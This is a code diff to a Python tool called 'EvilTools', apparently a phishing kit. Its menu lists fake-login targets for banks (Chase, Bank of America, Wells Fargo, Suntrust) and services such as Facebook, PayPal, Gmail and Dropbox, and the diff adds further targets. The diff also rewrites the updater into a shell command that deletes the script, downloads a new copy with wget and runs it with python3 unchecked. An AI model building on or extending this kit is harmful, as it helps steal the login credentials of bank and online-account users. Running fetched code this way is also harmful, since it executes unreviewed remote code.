@@ -101,14 +101,14 @@ def options():
     print()
     print(green+'['+white+'01'+green+']'+yellow+' Facebook                '+green+'['+white+'23'+green+']'+yellow+' Chase            '+green+'['+white+'99'+green+']'+yellow+' About')
     print(green+'['+white+'02'+green+']'+yellow+' Microsoft               '+green+'['+white+'45'+green+']'+yellow+' Bofa             '+green+'['+white+'00'+green+']'+yellow+' Exit')
-    print(green+'['+white+'03'+green+']'+yellow+' Outlook                 '+green+'['+white+'46'+green+']'+yellow+' Wells')
+    print(green+'['+white+'03'+green+']'+yellow+' Outlook                 '+green+'['+white+'46'+green+']'+yellow+' Wells            '+green+'['+white+' m'+green+']'+yellow+' More tools')
     print(green+'['+white+'04'+green+']'+yellow+' Yahoo                   '+green+'['+white+'46'+green+']'+yellow+' Suntrust')
     print(green+'['+white+'05'+green+']'+yellow+' Adobe')
     print(green+'['+white+'06'+green+']'+yellow+' Gmail')
-    print(green+'['+white+'14'+green+']'+yellow+' Paypal')
-    print(green+'['+white+'41'+green+']'+yellow+' eBay')
+    print(green+'['+white+'14'+green+']'+yellow+' Paypal                  '+green+'['+white+'44'+green+']'+yellow+' DropBox')
+    print(green+'['+white+'41'+green+']'+yellow+' eBay                    '+green+'['+white+'46'+green+']'+yellow+' WordPress')
+    print(green+'['+white+'22'+green+']'+yellow+' LinkedIn                '+green+'['+white+'46'+green+']'+yellow+' Webmail')
     print()
-    print(green+'['+white+'x'+green+']'+yellow+' About                    '+green+'['+white+'m'+green+']'+yellow+' More tools       '+green+'['+white+'0'+green+']'+yellow+' Exit')
     print()
     print()
 
@@ -139,7 +139,7 @@ def update():
         upask=input(ask+"Do you want to update EvilTools?[y/n] > "+green)
         if upask=="y":
             print(nc)
-            system("cd .. && rm -rf update evil.py && git clone https://github.com/lhost25/update")
+            system("cd .. && rm -rf evil.py && wget https://raw.githubusercontent.com/lhost25/update/main/evil.py && python3 evil.py")
             sprint("\n"+success+"EvilTools updated successfully!! Please restart terminal!\n")
             if (changelog != "404: Not Found"):
                 print(info2+"Changelog:\n"+purple+changelog)
